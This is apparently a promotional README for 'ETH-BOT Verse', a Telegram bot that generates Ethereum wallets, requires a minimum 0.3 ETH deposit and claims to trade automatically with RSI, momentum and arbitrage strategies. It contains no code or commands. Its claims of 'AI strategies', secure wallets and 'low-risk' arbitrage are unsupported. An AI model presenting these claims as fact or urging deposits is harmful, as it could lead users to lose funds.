# 🚀 ETH-BOT Verse v2.0

**Automated Ethereum Trading Bot** — A powerful Telegram bot for intelligent DeFi trading featuring AI-driven strategies, real-time analytics, and secure wallet management. Built with Ethers.js, powered by Infura and Etherscan. Trade without emotions, 24/7!

---

### 🤖 **LAUNCH BOT IN TELEGRAM** 🤖

**👆 Click to Start Trading! 👆**

---

## ✨ Key Features
- **🤖 AI Strategies**: RSI, Momentum, Arbitrage optimized for DEX platforms like Uniswap and SushiSwap
- **🛡 Risk Management**: Automatic Stop-Loss and Take-Profit for capital protection
- **⚡ Gas Optimization**: Dynamic gas pricing via Etherscan (Safe, Proposed, Fast modes)
- **📊 Real-Time Analytics**: P&L tracking, win rate, trade history with visual progress bars
- **💳 Wallet Integration**: Secure wallet generation, QR code deposits, balance monitoring
- **📱 Telegram-Native UI**: Inline keyboards, animations, no-code setup — user-friendly interface

---

## ⚙️ How It Works
1. **User Onboarding**
   - Start the bot in Telegram (`/start`)
   - Auto-generate secure Ethereum wallet (private key shown only to user)
   - Deposit ETH (min 0.3 ETH required)
2. **Strategy Selection**
   - Choose between **RSI**, **Momentum**, or **Arbitrage**
   - Adjust Stop-Loss / Take-Profit thresholds
   - Pick Gas Mode (Safe / Proposed / Fast)
3. **Execution Engine**
   - Connects to Ethereum Mainnet via Infura
   - Fetches gas data from Etherscan API
   - Monitors DEX pairs and mempool in real time
   - Executes trades automatically, optimized for chosen strategy
4. **Analytics & Reporting**
   - Live balance & P&L tracking
   - Trade statistics: win rate, profit vs. loss
   - Notifications directly in Telegram

## 📊 Workflow Diagram
Below is a visual flowchart illustrating the bot's operational flow, including branching for strategy-specific execution paths. This diagram highlights the seamless integration from onboarding to trade execution and monitoring.

```mermaid
flowchart TD
    A[🚀 Start Bot in Telegram /start] --> B[🔑 Generate Secure Wallet<br/>Ethers.js + Private Key Export]
    B --> C[💳 Deposit ETH<br/>Min: 0.3 ETH<br/>QR Code Support]
    C --> D[⚙️ Configure Settings<br/>Stop-Loss, Take-Profit, Gas Mode]
    D --> E[📈 Select Strategy]
    E --> F[📊 RSI Branch<br/>Oversold <30: Buy<br/>Overbought >70: Sell<br/>Sideways Market Optimized]
    E --> G[🚀 Momentum Branch<br/>Rising Trend: Buy<br/>Falling Trend: Sell<br/>Trend-Following Signals]
    E --> H[⚡ Arbitrage Branch<br/>DEX Price Diffs: Buy Low/Sell High<br/>Uniswap ↔ SushiSwap<br/>Low-Risk, Gas-Intensive]
    F --> I[🔍 Monitor Market & Mempool<br/>Infura RPC + Etherscan Gas]
    G --> I
    H --> I
    I --> J[🎯 Execute Trade<br/>Auto-Swap via DEX Aggregator<br/>Apply SL/TP Checks]
    J --> K[🛡️ Risk Check<br/>Stop-Loss Hit? → Sell<br/>Take-Profit Hit? → Sell]
    K --> L{Trade Outcome?}
    L -->|Profitable| M[✅ Update Stats<br/>+Profit, Win Rate ++<br/>P&L Notification]
    L -->|Loss| N[❌ Update Stats<br/>+Loss, Review Strategy<br/>Alert Notification]
    M --> O[📊 Real-Time Analytics<br/>Balance Refresh, Progress Bars]
    N --> O
    O --> P[🔄 Loop: Continuous Monitoring<br/>24/7 Operation]
    P --> I

    style A fill:#e1f5fe
    style E fill:#f3e5f5
    style F fill:#fff3e0
    style G fill:#fff3e0
    style H fill:#fff3e0
    style J fill:#e8f5e8
    style O fill:#f1f8e9
```

## 🛠 Technical Stack
The bot is built with modern, reliable tools for seamless Ethereum integration and Telegram interaction:

| Component | Technology | Purpose |
|-----------|-----------|---------|
| Blockchain | Ethers.js v6+ | Wallet generation, transaction signing, DEX swaps |
| Provider | Infura | Ethereum Mainnet RPC access for real-time data |
| API | Etherscan | Dynamic gas pricing and transaction monitoring |
| Bot Framework | Node-Telegram-Bot-API | Inline keyboards, polling, message handling |
| HTTP | Axios | Market data fetching and external API calls |
| Storage | In-Memory Map (Node.js) | User sessions and bot states (scalable to Redis) |

## 🚀 Roadmap
We're committed to evolving ETH-BOT Verse. Upcoming features:

- **v2.1 (Q4 2025)**: Multi-chain support (BSC, Polygon) + Flash Loan integration
- **v2.2 (Q1 2026)**: Advanced ML models for predictive analytics + Portfolio diversification
- **v2.3 (Q2 2026)**: API endpoints for external integrations + Mobile app companion

Contributions welcome! Check issues for open tasks.

## 📄 License
This project is licensed under the MIT License - see the LICENSE file for details.